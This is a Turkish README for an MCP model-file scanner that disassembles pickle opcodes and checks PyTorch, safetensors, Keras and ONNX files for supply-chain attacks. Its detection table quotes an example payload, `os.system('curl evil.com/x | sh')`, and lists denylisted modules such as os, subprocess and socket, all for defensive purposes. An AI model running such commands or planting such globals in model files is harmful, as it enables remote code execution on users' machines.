# @guardbee/mcp-model-scanner

[🇬🇧 English](README.md) | **🇹🇷 Türkçe**

MCP (Model Context Protocol) sunucusu — ML model dosyalarını **tedarik zinciri** riskleri için tarar: dosyayı yükleyen kodu değil, dosyanın kendisini.

Çoğu "AI security" aracı entegrasyon kodunuza veya prompt'lara bakar. Bu paket sizin (veya bir takım arkadaşınızın, ya da bir `pip install`'ın) Hugging Face'ten, bir registry'den ya da bir S3 bucket'ından indirdiği asıl dosyaya bakar: bir `.pt`/`.pth`/`.pkl` checkpoint bir **pickle** dosyasıdır ve unpickling sadece veri deserialization'ı değildir — dosya yüklendiği an (`torch.load()`, `pickle.load()` vb.) keyfi Python kodu çalıştırabilir. Zararlı bir checkpoint, hipotetik değil, iyi belgelenmiş gerçek bir saldırı vektörüdür.

> Bu paket varsayılan olarak kullanım telemetrisi gönderir (tool adı + kısa parametreler, taranan dosyanın içeriği hiçbir zaman dahil değil — bkz. [`@guardbee/mcp-telemetry`](../telemetry/TR.md)). Kapatmak için `GUARDBEE_TELEMETRY=0`.

```
Claude ──► model-scanner ──► Model dosyalarınız
              │
              ├─ .pt / .pth / .ckpt   → PyTorch zip container: data.pkl çıkar, disassemble et
              ├─ .pkl / .pickle / .bin → ham pickle stream, doğrudan disassemble et
              ├─ .safetensors         → header yapısı + disguised-binary kontrolü
              ├─ .h5 / .hdf5 / .keras → Keras Lambda-layer RCE heuristic'i
              └─ .onnx                → external_data path-traversal heuristic'i
```

---

## Neden pickle bu paketin merkezinde

Pickle stream'leri küçük bir stack VM için bytecode'dur. Bir `GLOBAL`/`STACK_GLOBAL` opcode'u import edilebilir herhangi bir Python nesnesini adlandırır; hemen sonraki opcode'lar genellikle onu çağırır. Hazırlanmış bir pickle'ın bir tensor-yeniden-oluşturma fonksiyonu yerine `os.system` ya da `subprocess.Popen` adlandırmasını engelleyen hiçbir şey yok — ve `pickle.load()`/`torch.load()` bunu sorunsuzca çözüp çalıştırır. Bu, `picklescan`/`fickling`/Hugging Face'in Picklescan entegrasyonu gibi araçların da üzerine kurulduğu aynı teknik.

Bu paket Python'a shell açmak ya da regex kullanmak yerine sıfırdan bir pickle opcode disassembler'ı implement ediyor (protokol 0-5, protokol 4+'ın kullandığı daha yeni `STACK_GLOBAL` kodlaması dahil) — her `GLOBAL` referansının gerçekte nerede olduğunu bilmek için opcode stream'inin byte byte doğru şekilde yürünmesi gerekiyor; ham byte'lar üzerinde bir regex hem kaçırır hem de sürekli yanlış alarm verirdi.

Bulunan her `GLOBAL`/`STACK_GLOBAL`/`INST` referansı şuna göre kontrol edilir:
- bir tensor deserialization yolunda görünmesi için hiçbir meşru sebebi olmayan modüllerin **denylist**'i (`os`, `subprocess`, `socket`, `builtins.eval`, `ctypes`, …) → **critical/high** olarak raporlanır
- gerçek ML framework'lerinin fiilen referans verdiği modüllerin **allowlist**'i (`numpy`, `torch`, `sklearn`, `collections`, …) → sessizce safe, gürültü yok
- diğer her şey → **medium** olarak raporlanır ("unknown", "malicious" değil — düşük yanlış-pozitif oranı için manuel inceleme amaçlı)

PyTorch'un varsayılan zip tabanlı checkpoint formatı için scanner, ZIP central directory'sini doğrudan diskten okuyup (Zip64 desteğiyle) sadece küçük `data.pkl` metadata girişini bulup çıkarır — çok gigabayt'lık bir checkpoint'i asla tamamen belleğe yüklemez.

---

## Özellikler

- **Gerçek pickle opcode disassembly** — regex değil, Python subprocess çağrısı değil
- 6 risk kategorisinde (code-execution, process-execution, network, filesystem, reflection, deserialization) **31 tehlikeli-global kuralı**
- **PyTorch zip container desteği** (Zip64 dahil) — tüm checkpoint'i yüklemeden `data.pkl`'i çıkarıp tarar
- **`.safetensors` yapısal doğrulama** — bozuk/sınır-dışı header'lar ve `.safetensors` uzantısıyla gizlenmiş bir pickle/zip tespiti
- **Keras `.h5`/`.keras` Lambda-layer RCE heuristic'i**
- **ONNX `external_data` path-traversal heuristic'i**
- Her yerde sınırlı okuma (10MB pickle prefix, 100MB safetensors header sınırı, 50MB zip-entry sınırı) — decompression bomb'lara karşı güvenli, büyük model dosyalarında OOM olmaz
- SARIF 2.1.0 çıktısı — CI/CD entegrasyonu (GitHub Code Scanning vb.)
- `guardbee.yml` ile config dosyası desteği
- 45 unit test, ayrıca gerçek CPython-`pickle` ve `zipfile` çıktılı fixture'lara karşı (sadece elle hazırlanmış değil) uçtan uca doğrulama

---

## Hızlı Başlangıç

### Claude Desktop / MCP Client

```json
{
  "mcpServers": {
    "guardbee-model-scanner": {
      "command": "npx",
      "args": ["-y", "@guardbee/mcp-model-scanner"]
    }
  }
}
```

### CLI (CI/CD)

```bash
npx @guardbee/mcp-model-scanner scan ./models --fail-on=high --format=sarif > results.sarif
```

---

## MCP Tools

| Tool | Açıklama |
|------|----------|
| `scan_file` | Tek bir model dosyasını tarar |
| `scan_directory` | Bir model dosyaları dizinini recursive tarar |
| `list_patterns` | Tehlikeli-global kataloğunu risk kategorisine göre listeler |

---

## Neyi yakalar

| Format | Kontrol | Önem | Örnek |
|---|---|---|---|
| pickle / PyTorch | `os`, `posix`, `nt`, `subprocess`, `socket`, `ctypes`, `runpy`, `pty.spawn`, `platform.popen`, `commands` referansı | critical | `os.system('curl evil.com/x \| sh')` |
| pickle / PyTorch | `builtins.eval`/`exec`/`compile`/`__import__`, `pickle.loads`, `marshal.loads` | critical | recursive/nested payload, ya da doğrudan eval |
| pickle / PyTorch | `builtins.getattr`/`open`, `shutil.*`, `importlib.*`, `requests.*`, `webbrowser.open`, `urllib*.urlopen` | high | exfiltration, SSRF, dosya okuma/yazma |
| safetensors | Header, uzunluk yerine pickle/zip imzasıyla başlıyor | critical | `.safetensors` olarak yeniden adlandırılmış bir `.pkl` |
| safetensors | Tensor `data_offsets` gerçek veri bölümünü aşıyor | high | sınır-dışı okuyan bir parser |
| safetensors | Geçersiz/aşırı büyük header uzunluğu, JSON olmayan header | high | bozuk ya da kasıtlı hazırlanmış header |
| Keras .h5/.keras | Model config'inde `class_name: "Lambda"` | critical | yüklemede marshalled-function RCE |
| ONNX | `..` içeren `external_data` location'ı | high | keyfi bir dosyaya path traversal |

Tam tehlikeli-global kataloğu için: `list_patterns` tool'unu çalıştırın, ya da [`src/dangerousGlobals.ts`](src/dangerousGlobals.ts)'e bakın.

Bunlar düşük yanlış-pozitif oranı için ayarlanmış **heuristic** bulgulardır — özellikle HDF5 ve ONNX karmaşık binary/protobuf formatlar olduğu için tam yapısal parse yerine sınırlı bir metin-kalıbı taramasıyla taranıyor. Her bulgu yine de gözden geçirilmeli; temiz bir tarama resmi bir güvenlik kanıtı değildir.

---

## Yapılandırma (`guardbee.yml`)

```yaml
model-scanner:
  fail-on: high       # any | critical | high | medium | low | none
  max-files: 2000
  exclude:
    - "fixtures/"
```

---

## Kısıtlamalar (bilinçli tasarım)

- Ham (zip olmayan) bir pickle stream'inin sadece ilk 10MB'ı taranır — bir pickle stream'inde tehlikeli global'ler instance'larından önce referans verilmek zorundadır, bu yüzden bu sınır dev legacy checkpoint'leri tamamen belleğe yüklemeye karşı makul bir trade-off.
- ZIP çıkarma sadece STORED ve DEFLATE'i destekler (varsayılan PyTorch checkpoint formatını kapsar).
- HDF5/ONNX kontrolleri sınırlı bir prefix üzerinde kalıp-tabanlıdır, tam yapısal/protobuf parse değildir.
- Bu araç **dosyayı** tarar, runtime davranışını değil — hiçbir şeyi çalıştırmaz ya da sandbox'lamaz.

---

## Geliştirme

```bash
npm run build
npm test             # 45 unit test
```

---

## Lisans

MIT — [GuardBee](https://guardbee.ai)
